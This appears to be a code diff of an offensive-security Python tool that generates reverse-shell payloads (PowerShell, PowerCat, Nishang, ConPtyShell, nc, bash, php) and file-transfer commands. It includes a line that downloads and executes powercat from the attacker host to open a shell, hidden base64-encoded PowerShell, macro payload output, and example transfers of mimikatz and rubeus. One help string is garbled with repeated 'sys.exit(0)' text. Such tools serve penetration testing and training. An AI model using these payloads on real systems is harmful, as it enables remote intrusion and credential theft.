@@ -5,7 +5,7 @@ import subprocess
 from base64 import b64encode
 import argparse
 
-# Macro number of chars per line
+# --macro payload number of chars per line
 chunk_size=32
 use_macro = False
 
@@ -96,7 +96,6 @@ def print_powershell(ip, port, use_macro):
         print(f"powershell -nop -w hidden -enc {pay}")
 
 
-
 def print_conpty(ip, port, rows, columns, use_macro):
     print("\n\n********** ConPtyShell RevShell **********\n")
     payload = f"Invoke-ConPtyShell -RemoteIp {ip} -RemotePort {port} -Rows {rows} -Cols {columns}"
@@ -169,9 +168,8 @@ def print_nishang(ip, port, use_macro):
 
 
 def print_powercat(ip, port, use_macro):
-
     
-    print("\n\n\n********** PowerCat payload **********\n")
+    print("\n\n********** PowerCat payload **********\n")
     payload = "powercat -c {ip} -p {port} -e powershell"
     print(payload)
 
@@ -191,7 +189,6 @@ def print_powercat(ip, port, use_macro):
     payload = f"IEX(New-Object System.Net.Webclient).DownloadString('http://{ip}/powercat.ps1'); powercat -c {ip} -p {port} -e powershell"
     print(payload)
     p64 = build(payload)
-    print(p64)
 
     if use_macro:
         print("\n\n********** Powercat reverse shell base64 Macro **********\n")
@@ -359,6 +356,7 @@ def print_trans(ip, port, protocol, file):
         print(f"curl http://{ip}{port_f}/{file} -o {file}")
         print(f"wget http://{ip}{port_f}/{file} -OutFile {file}")
         print(f"iwr -uri http://{ip}{port_f}/{file} -OutFile {file}")
+        print(f"iwr -UseBasicParsing http://{ip}{port_f}/{file}")
         print(f"enable TLS:")
         print(f"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12")
 
@@ -405,60 +403,61 @@ def print_trans(ip, port, protocol, file):
         print(f"Protocol '{protocol}' not recognized.")
 
 
+def shellpy_help():
+    print("Shells")
+    print("\n\tUsage: shellpy <IP> <PORT> <SHELL_TYPE> <ROWS> <COLUMNS> [--macro]")
+    print("\n\tShells types: \n\n\t\t-Powershell \n\t\t-nishang \n\t\t-conpty \n\t\t-powercat \n\t\t-perl \n\t\t-nc \n\t\t-bash \n\t\t-php")
+    print(f"\t\t--macro provides a base64 powershell payload ready to load as a macro, this option can only be used with -powercat, -nishang, -powershell, or -conpty.")
+    print("\n\tExamples:\n")
+    print(f"\t\tshellpy 192.168.1.72 4444 -php")
+    print(f"\t\tshellpy 192.168.1.72 4444 -powershell")
+    print(f"\t\tshellpy 192.168.1.72 4444 -nishang --macro")
+    print(f"\t\tshellpy 192.168.1.72 4444 -conpty 54 118")
+
+    print(f"\n\tFile transfer")
+    print("\n\tUsage: shell <IP> <PORT> -trans <PROTOCOL> <FILE>")
+    print("\n\tThe file transfer functions require installing the following libraries:")
+    print("\n\t\tpip3 install wsgidav")
+    print("\t\tpip install pyftpdlib")
+    print("\t\tpip install updog")
+    print("\t\tpython3 -m pip install --user uploadserver")
+    print("\n\tTransfers: \n\n\t\t-paths \n\t\t-installs \n\t\t-ftp \n\t\t-scp \n\t\t-socat \n\t\t-nc \n\t\t-http \n\t\t-smb ")
+    print("\n\tExamples:\n")
+    print(f"\t\tshellpy -paths")
+    print(f"\t\tshellpy 192.168.45.170 4444 -trans -smb rubeus.exe")
+    print(f"\t\tshellpy 192.168.45.170 4444 -trans -http mimikatz.exe")
+    
+    sys.exit(1)
+
 
 
 def main(use_macro):
 
-    ip = sys.argv[1]
+    if len(sys.argv) < 2:
+        shellpy_help()
 
+    ip = sys.argv[1]
     if ip == "-paths":
         print_paths()
         sys.exit(0)
 
     if len(sys.argv) < 4:
-        print("\n\tUsage: shell <IP> <PORT> <SHELL_TYPE> <ROWS> <COLUMNS> [--macro]")
-        print("Shells: \n\t-Powershell \n\t-nishang \n\t-conpty \n\t-powercat \n\t-perl \n\t-nc \n\t-bash \n\t-php")
-        print(f"\t--macro provides a base64 powershell payload ready to load as a macro, this option can only be used with -powercat, -nishang, -powershell, or -conpty.")
-        print("\nExamples:\n")
-        print(f"\tshell 192.168.1.72 4444 -php")
-        print(f"\tshell 192.168.1.72 4444 -powershell")
-        print(f"\tshell 192.168.1.72 4444 -nishang --macro")
-        print(f"\tshell 192.168.1.72 4444 -conpty 54 118")
-
-        print("\nUsage: shell <IP> <PORT> -trans <PROTOCOL> <FILE>")
-        print("\nThe file transfer functions require installing the following libraries:")
-        print("\n\tpip3 install wsgidav")
-        print("\tpip install pyftpdlib")
-        print("\tpip install updog")
-        print("\tpython3 -m pip install --user uploadserver")
-
-        print("\nTransfers: \n\t-paths \n\t-installs \n\t-ftp \n\t-scp \n\t-socat \n\t-nc \n\t-http \n\t-smb ")
-        print("\nExamples:\n")
-        print(f"\tshell -paths")
-        print(f"\tshell 192.168.45.170 4444 -trans -smb rubeus.exe")
-        print(f"\tshell 192.168.45.170 4444 -trans -http mimikatz.exe")
-
-
-        sys.exit(1)
-
-   
+        shellpy_help()
+  
+    ip = sys.argv[1]
     port = sys.argv[2]
     shell_type = sys.argv[3].lower()
 
-    # Verificar si el argumento --macro está presente
     if shell_type == "-trans":
         protocol = sys.argv[4].lower()
         file = sys.argv[5]
        
-
     else:
 
         if '--macro' in sys.argv:
             use_macro = True
-            # Eliminar el argumento --macro de la lista de argumentos
             sys.argv.remove('--macro')
 
-# Verificar el número mínimo de argumentos
         if len(sys.argv) > 4:
             try:
                 rows = int(sys.argv[4])
@@ -468,11 +467,9 @@ def main(use_macro):
                 print("Shells: \n\t-Powershell \n\t-nishang \n\t-conpty \n\t-sys.exit(0)sys.exit(0)sys.exit(0)sys.exit(0)sys.exit(0)sys.exit(0)sys.exit(0ipowercat \n\t-perl \n\t-nc \n\t-bash \n\t-php")
                 sys.exit(1)
         else:
-            # Si no se pasan rows y cols, utilizar valores por defecto o los valores obtenidos de stty
             output = subprocess.check_output(["stty", "size"]).decode().strip()
             rows, cols = map(int, output.split())
 
-# Verificar si el argumento --macro se usa con el shell_type correcto
         if use_macro and shell_type not in ['-powercat', '-nishang', '-powershell', '-conpty']:
             print("Error: --macro can only be used with -powercat, -nishang, -powershell, or -conpty.")
             sys.exit(1)
@@ -500,7 +497,6 @@ def main(use_macro):
         print_trans(ip, port, protocol, file)
     else:
         print(f"Shell type '{shell_type}' not recognized.")
-
 
 
 if __name__ == "__main__":
